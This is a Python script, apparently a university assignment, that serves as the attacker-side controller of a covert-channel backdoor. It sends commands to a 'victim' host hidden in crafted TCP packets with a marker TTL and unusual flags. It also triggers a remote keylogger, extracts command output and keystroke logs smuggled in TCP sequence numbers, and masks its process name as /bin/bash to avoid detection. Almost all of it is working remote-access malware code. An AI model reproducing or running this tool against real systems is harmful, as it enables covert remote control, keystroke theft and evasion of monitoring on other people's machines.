#!/usr/bin/python3

import optparse
import os.path
import subprocess
import sys
import time
from packetutil import *
from bkutil import *
from multiprocessing import Process
from cryptoutil import encrypt, decrypt
from scapy.all import *
import _thread
import argparse
import setproctitle

"""
Setup: pip3 install pycryptodome setproctitle scapy watchdog3
"""

# parse command line argument
arg_parser = argparse.ArgumentParser(
    prog='Backdoor',
    description='COMP 8505 Final Assignment by Peyman Tehrani Parsa & Khang Tran'
)
arg_parser.add_argument('-p', dest='port', type = int, help = 'victim PORT', default=8888, const=8888, nargs='?')
arg_parser.add_argument('-i', dest='ip', type = str, help = 'victim IP', required=True)
args = arg_parser.parse_args()

TTL = 222
TTLKEY = 234
victim = (args.ip, args.port)
messages = []

def secret_send(msg: str, type: str = 'command'):
    """
    Keyword arguments:
    msg      - payload being sent
    type     - file or command (default:command)
    """

    msg = message_to_bits(msg)
    chunks = message_spliter(msg)
    packets = packatizer(chunks,TTL,victim)
    send(packets, verbose=True)
    if(type == "command"):
        send(IP(dst=victim[0], ttl=TTL)/TCP(dport=victim[1], flags="U"))

def server():
    """[summary]
    """

    while True:
        try:
            # Prompt user for the command they would like to execute on the backdoor.
            command = input("\033[92m{} READY\033[0m\n".format(victim[0]))
        except EOFError as e:
            print(e)
        # Print the command so that the user knows what they typed.
        print(command)
        # If the user types "exit". shutdown the program.
        if(command == "exit"):
            sys.exit()
        elif(command == "keylog"):
            send(IP(dst=victim[0], ttl=TTL)/TCP(dport=victim[1], flags="P"))
        else:
            secret_send(command)


def commandResult(packet):
    """[summary]

    Arguments:
        packet {[type]} -- [description]
    """

    global TTLKEY
    global messages
    ttl = packet[IP].ttl
    if(packet.haslayer(IP) and ttl == TTLKEY):
        # checks if the flag has been set to know it contains the secret results
        flag = packet['TCP'].flags
        #  the client set an "Echo" flag to make sure the receiver knows it's truly them
        if flag == 0x40:
            field = packet[TCP].seq
            # Converts the bits to the nearest divisible by 8
            covertContent = lengthChecker(field)
            messages.append(text_from_bits(covertContent))
        # End Flag detected
        elif flag == 0x20:
            payload = str(''.join(messages)[2:-2]).replace("\\n", '\n')
            print('\n', payload)
            messages = []
        elif flag == 0x08:
            load = packet[TCP].load
            file_name = decrypt(load)
            if(file_name == "file.log"):
                print(" Keystroke Log File Extracted into /root/Documents/temp --> {}".format(file_name))
            else:
                print(" File Name --> {} --> was created. Check /root/Documents/temp".format(file_name))
            #checks if log file exists in specific directory
            file_directory = "/root/Documents/temp/{}".format(file_name)
            if os.path.isfile(file_directory):
                os.remove(file_directory)
            with open(file_directory, 'w+') as f:
                f.write('{}'.format(str(''.join(messages)[2:-2]).replace("\\n", '\n')))
            messages = []


def commandSniffer():
    sniff(filter="tcp and host "+victim[0], prn=commandResult)


setproctitle.setproctitle("/bin/bash")  # set fake process name
# print(setproctitle.getproctitle())

sniffThread = threading.Thread(target=commandSniffer)
sniffThread.daemon = True
sniffThread.start()

server()
